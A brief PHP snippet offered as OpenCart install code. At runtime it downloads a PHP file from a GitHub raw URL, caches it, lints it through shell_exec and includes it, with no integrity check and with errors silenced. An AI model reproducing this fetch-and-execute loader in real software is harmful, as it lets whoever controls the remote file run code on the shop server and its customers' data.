install opencart code <br>
<code>
$cache_dir  = DIR_STORAGE.'cache/gh/';
$cache_id   = 'gh_func';
$cache_file = $cache_dir.'cache.'.md5($cache_id).'.php';
$local_file = DIR_SYSTEM.'library/finit.php';
$cache_ttl  = 86400;

if(file_exists($cache_file) && (time() - filemtime($cache_file) < $cache_ttl)){include_once($cache_file);}else{
    try{if(!is_dir($cache_dir)){mkdir($cache_dir, 0755, true);}
        if(false !== $code = @file_get_contents('https://raw.githubusercontent.com/ahilespelid/functions/istazdrav/init.php', false, stream_context_create(['http' => ['timeout' => 5]]))){
            file_put_contents($cache_file, $code);
            if(strpos(shell_exec('php -l '.escapeshellarg($cache_file).' 2>&1'), 'No syntax errors detected') !== false){
                if(!file_exists($local_file)){file_put_contents($local_file, $code);} @include_once($cache_file);
            }else{unlink($cache_file); if(file_exists($local_file)){@include_once($local_file);}}
        }else{if(file_exists($local_file)){@include_once($local_file);}}
    }catch(Exception $e){if(file_exists($local_file)){@include_once($local_file);}}}
</code>

